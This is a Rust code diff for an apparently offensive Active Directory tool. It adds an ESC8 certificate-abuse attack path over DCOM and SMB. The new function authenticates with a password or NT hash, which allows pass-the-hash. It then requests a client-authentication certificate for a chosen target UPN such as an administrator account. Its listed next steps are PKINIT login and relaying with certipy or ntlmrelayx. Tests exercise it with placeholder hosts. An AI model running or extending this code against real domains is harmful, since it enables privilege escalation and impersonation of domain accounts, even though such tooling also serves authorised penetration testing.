@@ -94,6 +94,21 @@ pub enum AdcsAction {
         /// Target UPN to embed in CSR subject (optional)
         target_upn: Option<String>,
     },
+    /// ESC8 via DCOM activation over SMB named pipe.
+    ///
+    /// Full DCOM path: activates CCertRequest via IRemoteSCMActivator
+    /// on \pipe\epmapper, obtains OBJREF with IPID, then calls
+    /// ICertRequestD::RequestCertificate on \pipe\cert.
+    ///
+    /// Requires SMB credentials (password or NT hash) for authentication.
+    Esc8RpcDcom {
+        /// CA server hostname or IP
+        ca_server: String,
+        /// Certificate template name
+        template: String,
+        /// Target UPN to embed in CSR subject (optional)
+        target_upn: Option<String>,
+    },
     /// ESC9 — Weak Certificate Mappings
     Esc9 {
         /// Template to exploit
@@ -116,6 +131,7 @@ impl std::fmt::Display for AdcsAction {
             Self::Esc7 { ca_name, .. } => write!(f, "ESC7 ({})", ca_name),
             Self::Esc8 { ca_server, .. } => write!(f, "ESC8 ({})", ca_server),
             Self::Esc8Rpc { ca_server, .. } => write!(f, "ESC8 RPC ({})", ca_server),
+            Self::Esc8RpcDcom { ca_server, .. } => write!(f, "ESC8 DCOM ({})", ca_server),
             Self::Esc9 { template, .. } => write!(f, "ESC9 ({})", template),
         }
     }
@@ -244,6 +260,11 @@ pub async fn run_adcs(config: &AdcsConfig) -> Result<AdcsResult> {
             template,
             target_upn,
         } => execute_esc8_rpc(ca_server, template, target_upn.as_deref()).await,
+        AdcsAction::Esc8RpcDcom {
+            ca_server,
+            template,
+            target_upn,
+        } => execute_esc8_rpc_dcom(config, ca_server, template, target_upn.as_deref()).await,
         AdcsAction::Esc9 {
             template,
             target_upn,
@@ -755,6 +776,99 @@ async fn execute_esc8_rpc(
     })
 }
 
+/// Execute ESC8 via DCOM activation over SMB named pipe.
+///
+/// Full DCOM path with SMB authentication: activates CCertRequest via
+/// IRemoteSCMActivator, then calls ICertRequestD::RequestCertificate.
+/// Requires SMB credentials (password or NT hash) from `AdcsConfig`.
+async fn execute_esc8_rpc_dcom(
+    config: &AdcsConfig,
+    ca_server: &str,
+    template: &str,
+    target_upn: Option<&str>,
+) -> Result<AdcsResult> {
+    info!(
+        "[ESC8-DCOM] Requesting cert via DCOM: CA={}, template={}, upn={:?}",
+        ca_server, template, target_upn
+    );
+
+    // Determine auth credentials — require password or NT hash
+    let password = config.password.as_deref();
+    let nt_hash = config.nt_hash.as_deref();
+
+    let has_password = password.is_some_and(|p| !p.is_empty());
+    let has_nt_hash = nt_hash.is_some_and(|h| !h.is_empty());
+
+    if !has_password && !has_nt_hash {
+        return Err(OverthroneError::Adcs(
+            "ESC8 DCOM requires credentials: provide --password or --nt-hash".to_string(),
+        ));
+    }
+
+    let subject = target_upn.unwrap_or("cert-request");
+
+    // Generate a client authentication CSR
+    let (csr_der, _private_key) =
+        overthrone_core::adcs::csr::create_client_auth_csr(subject, template, Some(ca_server))
+            .map_err(|e| OverthroneError::Adcs(format!("Failed to generate CSR: {e}")))?;
+
+    // Connect via SMB with password or NT hash
+    use overthrone_core::proto::smb::SmbSession;
+    let smb = if has_nt_hash {
+        SmbSession::connect_with_hash(
+            ca_server,
+            &config.domain,
+            &config.username,
+            nt_hash.unwrap(),
+        )
+        .await
+        .map_err(|e| OverthroneError::Rpc {
+            target: ca_server.to_string(),
+            reason: format!("SMB connect with hash failed: {e}"),
+        })?
+    } else {
+        SmbSession::connect(
+            ca_server,
+            &config.domain,
+            &config.username,
+            password.unwrap_or(""),
+        )
+        .await
+        .map_err(|e| OverthroneError::Rpc {
+            target: ca_server.to_string(),
+            reason: format!("SMB connect failed: {e}"),
+        })?
+    };
+
+    // Request certificate via DCOM activation
+    let cert_der =
+        crate::ms_wcce_dcom::request_cert_via_dcom(&smb, ca_server, template, subject, &csr_der)
+            .await?;
+
+    info!(
+        "[ESC8-DCOM] Certificate obtained ({} bytes) from {}",
+        cert_der.len(),
+        ca_server
+    );
+
+    Ok(AdcsResult {
+        action: "ESC8 DCOM".to_string(),
+        ca_server: ca_server.to_string(),
+        success: true,
+        certificate_pfx: Some(cert_der.clone()),
+        certificate_thumbprint: None,
+        message: format!(
+            "ESC8 DCOM succeeded: certificate requested via DCOM activation from {} ({} bytes)",
+            ca_server,
+            cert_der.len()
+        ),
+        next_steps: vec![
+            "Use certificate for PKINIT authentication".to_string(),
+            "Convert to PFX for use with certipy/ntlmrelayx".to_string(),
+        ],
+    })
+}
+
 async fn execute_esc9(config: &AdcsConfig, template: &str, target_upn: &str) -> Result<AdcsResult> {
     let ca_server = config.ca_server()?;
     let exploiter = Esc9Exploiter::new(&ca_server)?;
@@ -923,6 +1037,91 @@ mod tests {
         assert!(result.success);
         assert_eq!(result.next_steps.len(), 2);
         assert!(!result.message.is_empty());
+    }
+
+    #[test]
+    fn test_adcs_action_display_esc8_dcom() {
+        let action = AdcsAction::Esc8RpcDcom {
+            ca_server: "ca.corp.local".to_string(),
+            template: "User".to_string(),
+            target_upn: Some("admin@corp.local".to_string()),
+        };
+        let s = format!("{}", action);
+        assert!(s.contains("ESC8 DCOM"));
+        assert!(s.contains("ca.corp.local"));
+    }
+
+    #[test]
+    fn test_esc8_rpc_dcom_requires_credentials() {
+        let config = AdcsConfig {
+            ca_url: "http://ca.corp.local/certsrv".to_string(),
+            domain: "corp.local".to_string(),
+            username: "user".to_string(),
+            password: None,
+            nt_hash: None,
+            action: AdcsAction::Esc8RpcDcom {
+                ca_server: "ca.corp.local".to_string(),
+                template: "User".to_string(),
+                target_upn: None,
+            },
+            output_path: None,
+            dry_run: false,
+        };
+
+        let rt = tokio::runtime::Runtime::new().unwrap();
+        let result = rt.block_on(run_adcs(&config));
+        assert!(result.is_err());
+        assert!(
+            result
+                .unwrap_err()
+                .to_string()
+                .contains("requires credentials")
+        );
+    }
+
+    #[test]
+    fn test_esc8_rpc_dcom_dry_run_success() {
+        let config = AdcsConfig {
+            ca_url: "http://ca.corp.local/certsrv".to_string(),
+            domain: "corp.local".to_string(),
+            username: "user".to_string(),
+            password: Some("pass".to_string()),
+            nt_hash: None,
+            action: AdcsAction::Esc8RpcDcom {
+                ca_server: "ca.corp.local".to_string(),
+                template: "User".to_string(),
+                target_upn: None,
+            },
+            output_path: None,
+            dry_run: true,
+        };
+
+        let rt = tokio::runtime::Runtime::new().unwrap();
+        let result = rt.block_on(run_adcs(&config)).unwrap();
+        assert!(result.success);
+        assert!(result.message.contains("[dry-run]"));
+    }
+
+    #[test]
+    fn test_esc8_rpc_dcom_action_serialization() {
+        let action = AdcsAction::Esc8RpcDcom {
+            ca_server: "ca.corp.local".to_string(),
+            template: "DomainController".to_string(),
+            target_upn: None,
+        };
+        let json = serde_json::to_string(&action).unwrap();
+        let parsed: AdcsAction = serde_json::from_str(&json).unwrap();
+        match parsed {
+            AdcsAction::Esc8RpcDcom {
+                ca_server,
+                template,
+                ..
+            } => {
+                assert_eq!(ca_server, "ca.corp.local");
+                assert_eq!(template, "DomainController");
+            }
+            _ => panic!("Wrong variant deserialized"),
+        }
     }
 
     #[test]
